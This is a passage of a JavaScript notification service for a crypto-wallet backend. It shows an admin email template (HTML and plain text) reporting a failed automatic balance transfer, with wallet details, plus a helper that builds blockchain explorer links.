          .header { background: linear-gradient(135deg, #f44336 0%, #d32f2f 100%); color: white; padding: 30px; text-align: center; }
          .content { padding: 30px; }
          .error-box { background: #ffebee; border-left: 4px solid #f44336; padding: 20px; margin: 20px 0; border-radius: 8px; }
          .info-grid { display: grid; grid-template-columns: 140px 1fr; gap: 10px; margin: 10px 0; }
          .info-label { font-weight: bold; color: #666; }
          .info-value { color: #333; word-break: break-all; }
          .error-message { background: #fff3cd; padding: 15px; border-radius: 8px; border-left: 4px solid #ffc107; margin: 20px 0; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>❌ Auto-Send Failed</h1>
            <p style="margin: 5px 0 0 0; font-size: 16px;">Immediate Attention Required</p>
          </div>
          
          <div class="content">
            <div class="error-box">
              <h2 style="margin-top: 0; color: #f44336;">❌ Transfer Failed</h2>
              <p>The automatic balance transfer has failed. Manual intervention may be required.</p>
            </div>

            <div class="error-message">
              <h3 style="margin-top: 0; color: #856404;">Error Details:</h3>
              <p style="margin: 0; font-family: monospace; color: #856404;"><strong>${
                data.error || data.errorMessage || "Unknown error"
              }</strong></p>
            </div>

            <div style="background: #f9f9f9; padding: 20px; border-radius: 8px; margin: 20px 0;">
              <h3 style="margin-top: 0;">📊 Wallet Information</h3>
              <div class="info-grid">
                <div class="info-label">Wallet Name:</div>
                <div class="info-value">${data.walletName || "N/A"}</div>
                
                <div class="info-label">Wallet ID:</div>
                <div class="info-value"><code>${data.walletId}</code></div>
                
                <div class="info-label">Chain:</div>
                <div class="info-value">${data.chain}</div>
                
                <div class="info-label">Attempted Amount:</div>
                <div class="info-value"><strong>${
                  data.amount || data.totalAmount
                } ${data.symbol || data.chain}</strong></div>
                
                <div class="info-label">From Address:</div>
                <div class="info-value"><code style="font-size: 12px;">${
                  data.fromAddress || data.walletAddress
                }</code></div>
                
                <div class="info-label">To Address:</div>
                <div class="info-value"><code style="font-size: 12px;">${
                  data.toAddress || data.destinationAddress
                }</code></div>
                
                <div class="info-label">Failure Time:</div>
                <div class="info-value">${new Date(
                  data.timestamp || Date.now()
                ).toLocaleString()}</div>
              </div>
            </div>

            <div style="background: #fff3cd; padding: 15px; border-radius: 8px; border-left: 4px solid #ffc107; margin: 20px 0;">
              <h4 style="margin-top: 0; color: #856404;">⚠️ Action Required</h4>
              <ul style="margin: 0; padding-left: 20px; color: #856404;">
                <li>Check wallet balance and gas fees</li>
                <li>Verify destination address is correct</li>
                <li>Review error message for specific issue</li>
                <li>Consider manual transfer if needed</li>
              </ul>
            </div>

            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 12px; text-align: center;">
              <p>This is an automated notification from TrustWallet Backend.</p>
              <p>Generated: ${new Date().toISOString()}</p>
            </div>
          </div>
        </div>
      </body>
      </html>
    `;

    const text = `
╔═══════════════════════════════════════════════════════════╗
❌ AUTO-SEND FAILED - IMMEDIATE ATTENTION REQUIRED
╚═══════════════════════════════════════════════════════════╝

❌ Transfer Failed
The automatic balance transfer has failed. Manual intervention may be required.

ERROR DETAILS:
${data.error || data.errorMessage || "Unknown error"}

📊 WALLET INFORMATION:
- Wallet Name: ${data.walletName || "N/A"}
- Wallet ID: ${data.walletId}
- Chain: ${data.chain}
- Attempted Amount: ${data.amount || data.totalAmount} ${
      data.symbol || data.chain
    }
- From Address: ${data.fromAddress || data.walletAddress}
- To Address: ${data.toAddress || data.destinationAddress}
- Failure Time: ${new Date(data.timestamp || Date.now()).toLocaleString()}

⚠️  ACTION REQUIRED:
- Check wallet balance and gas fees
- Verify destination address is correct
- Review error message for specific issue
- Consider manual transfer if needed

═══════════════════════════════════════════════════════════
TrustWallet Backend - Administrative Monitoring System
Generated: ${new Date().toISOString()}
    `;

    return await this.sendAdminEmail(subject, html, text);
  }

  /**
   * Get blockchain explorer URL
   */
  getExplorerUrl(chain, txHash) {
    const explorers = {
      ETHEREUM: `https://etherscan.io/tx/${txHash}`,
      BSC: `https://bscscan.com/tx/${txHash}`,
      POLYGON: `https://polygonscan.com/tx/${txHash}`,
      ARBITRUM: `https://arbiscan.io/tx/${txHash}`,
      OPTIMISM: `https://optimistic.etherscan.io/tx/${txHash}`,
      AVALANCHE: `https://snowtrace.io/tx/${txHash}`,
      FANTOM: `https://ftmscan.com/tx/${txHash}`,
      BASE: `https://basescan.org/tx/${txHash}`,
      BITCOIN: `https://blockchain.com/btc/tx/${txHash}`,
      SOLANA: `https://solscan.io/tx/${txHash}`,
    };

    return explorers[chain.toUpperCase()] || `#`;
  }
}

module.exports = new NotificationService();
